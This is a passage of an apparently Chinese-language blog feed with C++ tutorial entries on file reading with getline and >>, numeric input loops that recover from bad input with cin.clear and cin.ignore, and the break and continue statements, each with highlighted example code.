class="line">    <span class="keyword">if</span> (inFile.eof()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nReached end of file.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (inFile.fail()) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;\nError reading file (not EOF).&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 关闭文件</span></span><br><span class="line">    inFile.close();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Stored Lines ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; stored_line : lines) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; stored_line &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 示例：使用 &gt;&gt; 读取特定类型的数据 (假设文件格式已知)</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ifstream <span class="title">dataFile</span><span class="params">(<span class="string">&quot;report.txt&quot;</span>)</span></span>; <span class="comment">// 重新打开文件</span></span><br><span class="line">    <span class="keyword">if</span> (!dataFile.is_open()) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Could not reopen report.txt&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nReading specific data using &gt;&gt; (may be fragile):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> header, productLabel, productName, qtyLabel;</span><br><span class="line">    <span class="keyword">int</span> quantity;</span><br><span class="line">    <span class="keyword">double</span> revenue;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 跳过第一行</span></span><br><span class="line">    <span class="built_in">std</span>::getline(dataFile, header);</span><br><span class="line">    <span class="comment">// 读取第二行的数据</span></span><br><span class="line">    dataFile &gt;&gt; productLabel &gt;&gt; productName;</span><br><span class="line">    <span class="comment">// 读取第三行的数据</span></span><br><span class="line">    dataFile &gt;&gt; qtyLabel &gt;&gt; quantity;</span><br><span class="line">    <span class="comment">// 跳过第四行的 Revenue: 标签</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> revenueLabel;</span><br><span class="line">    dataFile &gt;&gt; revenueLabel &gt;&gt; revenue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dataFile) &#123; <span class="comment">// 检查读取是否成功</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Product: &quot;</span> &lt;&lt; productName &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Quantity: &quot;</span> &lt;&lt; quantity &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Revenue: &quot;</span> &lt;&lt; revenue &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Failed to parse data using &gt;&gt;&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dataFile.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 第一个循环使用 <code>std::getline()</code> 读取文件的每一行，并将其打印出来，同时存储在 <code>lines</code> 向量中。<code>while (std::getline(inFile, line))</code> 是读取文本文件的常用模式。</li><li> 循环结束后，通过检查 <code>inFile.eof()</code> 和 <code>inFile.fail()</code> 可以判断循环是正常结束（到达文件末尾）还是因为其他错误。</li><li> 第二个示例演示了使用 <code>&gt;&gt;</code> 操作符读取特定格式的数据。这种方法对于格式严格固定的文件可能有效，但如果文件格式稍有变化（例如多了空格），<code>&gt;&gt;</code> 就可能读取失败或读到错误的数据，因此通常不如 <code>getline</code> 健壮。需要仔细处理标签和数据类型。</li></ol><p>文件 I/O 是 C++ 编程中非常重要的部分，它使得程序能够持久化数据，并与其他程序或系统进行交互。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.7 读取数字的循环</title>
      <link href="2025/04/26/6.7_%E8%AF%BB%E5%8F%96%E6%95%B0%E5%AD%97%E7%9A%84%E5%BE%AA%E7%8E%AF/"/>
      <url>2025/04/26/6.7_%E8%AF%BB%E5%8F%96%E6%95%B0%E5%AD%97%E7%9A%84%E5%BE%AA%E7%8E%AF/</url>
      
        <content type="html"><![CDATA[<p>在 C++ 程序中，经常需要编写循环来读取用户的数字输入，直到满足某个条件（例如输入特定值或遇到无效输入）为止。然而，处理数字输入，特别是处理潜在的错误输入，需要一些技巧。</p><h2 id="基本的数字读取循环"><a href="#基本的数字读取循环" class="headerlink" title="基本的数字读取循环"></a>基本的数字读取循环</h2><p>一个简单的读取数字并累加的循环可能如下所示：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> input_number;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter numbers to sum (enter a non-number to quit): &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 尝试读取一个整数，如果成功，cin 返回 true</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; input_number) &#123;</span><br><span class="line">        sum += input_number;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Current sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter next number: &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当输入非数字时，循环结束</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nLoop terminated.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>工作方式:</strong></p><ol><li> <code>std::cin &gt;&gt; input_number</code> 尝试从输入流中读取一个整数并存储到 <code>input_number</code> 中。</li><li> 这个表达式本身会返回 <code>std::cin</code> 对象。在需要布尔值的上下文中（如 <code>while</code> 的条件），<code>std::cin</code> 对象会根据流的状态转换为 <code>true</code> 或 <code>false</code>。</li><li> 如果成功读取一个整数，流状态是正常的，<code>std::cin</code> 转换为 <code>true</code>，循环体执行。</li><li> 如果用户输入了非数字（例如输入 “hello” 或按 Ctrl+Z/Ctrl+D 表示文件结束），<code>std::cin &gt;&gt; input_number</code> 会失败。此时，<code>std::cin</code> 会进入“失败”（fail）状态，转换为 <code>false</code>，循环终止。</li></ol><h2 id="处理错误输入"><a href="#处理错误输入" class="headerlink" title="处理错误输入"></a>处理错误输入</h2><p>上面的简单循环在遇到非数字输入时会终止，但它没有明确地处理错误状态。如果循环结束后还需要继续从 <code>std::cin</code> 读取其他类型的输入，就需要清除错误状态并丢弃无效的输入。</p><p><strong>问题:</strong> 当 <code>std::cin &gt;&gt; input_number</code> 失败时，输入流 <code>std::cin</code> 会设置一个错误标志（failbit），并且导致失败的输入（例如 “hello”）仍然留在输入缓冲区中。如果不处理，后续的 <code>std::cin</code> 操作通常也会立即失败。</p><p><strong>解决方案:</strong></p><ol><li> <strong>清除错误状态:</strong> 使用 <code>std::cin.clear()</code> 方法重置流的错误标志。</li><li> <strong>忽略无效输入:</strong> 使用 <code>std::cin.ignore()</code> 方法丢弃输入缓冲区中不需要的字符。通常会忽略直到下一个换行符 <code>\n</code> 或达到某个最大字符数。</li></ol><p><strong>示例 (更健壮的数字读取循环):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // 需要包含 &lt;limits&gt; 来使用 numeric_limits</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> input_number;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter numbers to sum (enter a non-number to quit): &quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123; <span class="comment">// 使用无限循环，内部处理退出条件</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number: &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; input_number) &#123;</span><br><span class="line">            <span class="comment">// 成功读取数字</span></span><br><span class="line">            sum += input_number;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Current sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 读取失败 (输入了非数字或 EOF)</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Invalid input detected or EOF reached.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 检查是否是文件结束符 (EOF)</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.eof()) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;End of file reached. Exiting.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// 如果是 EOF，直接退出循环</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 清除错误标志，使 cin 恢复正常</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Clearing error state...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cin</span>.clear();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 丢弃缓冲区中导致错误的无效输入，直到换行符</span></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Discarding invalid input...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore(<span class="built_in">std</span>::numeric_limits&lt;<span class="built_in">std</span>::streamsize&gt;::max(), <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Please try entering a number again, or press Ctrl+Z/Ctrl+D to exit.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="comment">// 注意：在这个版本中，遇到非数字输入后，我们提示用户重试或退出，</span></span><br><span class="line">            <span class="comment">// 而不是像第一个例子那样直接终止求和。</span></span><br><span class="line">            <span class="comment">// 如果希望遇到非数字就退出，可以在 else 块的末尾加上 break;</span></span><br><span class="line">            <span class="comment">// break; // 取消注释此行，则遇到非数字输入时退出循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nLoop finished.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以在这里尝试读取其他输入，因为错误状态已被清除</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> remaining_input;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter some text: &quot;</span>;</span><br><span class="line">    <span class="comment">// 需要先忽略掉上次输入留下的换行符（如果存在）</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">cin</span>.peek() == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cin</span>.ignore();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::getline(<span class="built_in">std</span>::<span class="built_in">cin</span>, remaining_input);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; remaining_input &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 使用 <code>while(true)</code> 创建一个看似无限的循环，退出逻辑放在循环内部。</li><li> <code>if (std::cin &gt;&gt; input_number)</code> 尝试读取数字。</li><li> 如果成功，执行加法。</li><li>如果失败 (<code>else</code> 块)：<ul><li>  打印错误消息。</li><li>  检查是否是文件结束符 (<code>std::cin.eof()</code>)，如果是则 <code>break</code>。</li><li>  调用 <code>std::cin.clear()</code> 清除 <code>failbit</code> 等错误状态。</li><li>  调用 <code>std::cin.ignore(...)</code> 来丢弃缓冲区中的无效输入。<code>std::numeric_limits&lt;std::streamsize&gt;::max()</code> 表示忽略尽可能多的字符，直到遇到换行符 <code>\n</code>。这确保了下一次循环迭代时，<code>std::cin</code> 不会再次读取相同的无效输入。</li><li>  根据需要，可以选择 <code>break</code> 退出，或者让循环继续，提示用户重新输入。</li></ul></li></ol><p>这种模式在需要从用户那里可靠地读取数字输入时非常有用，因为它能优雅地处理输入错误，而不是让程序因为意外的输入而崩溃或行为异常。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.6 break 和 continue 语句</title>
      <link href="2025/04/26/6.6_break%E5%92%8Ccontinue%E8%AF%AD%E5%8F%A5/"/>
      <url>2025/04/26/6.6_break%E5%92%8Ccontinue%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<p>C++ 提供了两个特殊的语句，<code>break</code> 和 <code>continue</code>，用于在循环（<code>for</code>, <code>while</code>, <code>do while</code>）或 <code>switch</code> 语句内部改变正常的执行流程。</p><h2 id="6-6-1-break-语句"><a href="#6-6-1-break-语句" class="headerlink" title="6.6.1 break 语句"></a>6.6.1 break 语句</h2><p><code>break</code> 语句用于立即终止<strong>包含它</strong>的最内层的循环（<code>for</code>, <code>while</code>, <code>do while</code>）或 <code>switch</code> 语句的执行。程序控制流会跳转到该循环或 <code>switch</code> 语句之后的下一条语句。</p><p><strong>用法:</strong></p><ul><li>  <strong>在循环中:</strong> 当满足某个特定条件时，提前退出循环。</li><li>  <strong>在 <code>switch</code> 语句中:</strong> 防止“贯穿”（fall-through）到下一个 <code>case</code>，在执行完匹配的 <code>case</code> 代码块后跳出 <code>switch</code> 结构（如 6.5 节所述）。</li></ul><p><strong>示例 (在循环中使用):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 查找数组中第一个负数的位置</span></span><br><span class="line">    <span class="keyword">int</span> numbers[] = &#123;<span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">-2</span>, <span class="number">8</span>, <span class="number">-5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> found_index = <span class="number">-1</span>; <span class="comment">// 初始化为 -1，表示未找到</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Searching for the first negative number...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Checking index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, value: &quot;</span> &lt;&lt; numbers[i] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">if</span> (numbers[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            found_index = i;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Negative number found at index &quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;. Breaking loop.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 找到第一个负数，立即跳出 for 循环</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (found_index != <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The loop was terminated early.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;No negative number found in the array.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示在嵌套循环中的作用</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nNested loop example:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">3</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= <span class="number">3</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i == <span class="number">2</span> &amp;&amp; j == <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Breaking inner loop at i=&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j=&quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// 只跳出内层循环 (j 循环)</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;i=&quot;</span> &lt;&lt; i &lt;&lt; <span class="string">&quot;, j=&quot;</span> &lt;&lt; j &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// break 后，控制流会到达这里，继续外层循环的下一次迭代</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;End of inner loop for i=&quot;</span> &lt;&lt; i &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码解释:</strong></p><ol><li> 第一个循环遍历 <code>numbers</code> 数组。当 <code>i</code> 为 3 时，<code>numbers[3]</code> 是 -2，满足 <code>if</code> 条件。<code>found_index</code> 被设为 3，打印消息，然后 <code>break</code> 语句被执行，立即终止 <code>for</code> 循环。后面的元素（8 和 -5）不会被检查。</li><li> 在嵌套循环示例中，当 <code>i</code> 为 2 且 <code>j</code> 为 2 时，<code>break</code> 语句执行。它只终止了最内层的 <code>j</code> 循环。外层的 <code>i</code> 循环继续执行其下一次迭代（当 <code>i</code> 为 3 时）。</li></ol><h2 id="6-6-2-continue-语句"><a href="#6-6-2-continue-语句" class="headerlink" title="6.6.2 continue 语句"></a>6.6.2 continue 语句</h2><p><code>continue</code> 语句用于跳过当前循环迭代中<strong>剩余</strong>的代码，并立即开始下一次迭代。与 <code>break</code> 不同，<code>continue</code> 不会终止整个循环。</p><p><strong>用法:</strong></p><ul><li>  <strong>在 <code>while</code> 和 <code>do while</code> 循环中:</strong> 控制流跳转到循环条件的判断处。</li><li>  <strong>在 <code>for</code> 循环中:</strong> 控制流首先跳转到 <code>for</code> 循环的更新表达式（例如 <code>++i</code>），然后跳转到循环条件的判断处。</li></ul><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 打印 1 到 10 之间的奇数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Odd numbers between 1 and 10:&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>) &#123; <span class="comment">// 如果 i 是偶数</span></span><br><span class="line">            <span class="keyword">continue</span>;     <span class="comment">// 跳过本次迭代剩余的部分 (cout 语句)，直接进行下一次迭代 (i++)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 只有当 i 是奇数时，才会执行这行代码</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 1 3 5 7 9</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 演示在 while 循环中</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nSkipping number 5 in while loop (1 to 7):&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; <span class="number">7</span>) &#123;</span><br><span class="line">        k++; <span class="comment">// 先递增 k</span></span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">5</span>) &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;(Skipping 5) &quot;</span>;</span><br><span class="line">            <span class="keyword">continue</span>; <span class="comment">// 跳过本次迭代的 cout</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; k &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出: 1 2 3 4 (Skipping 5) 6 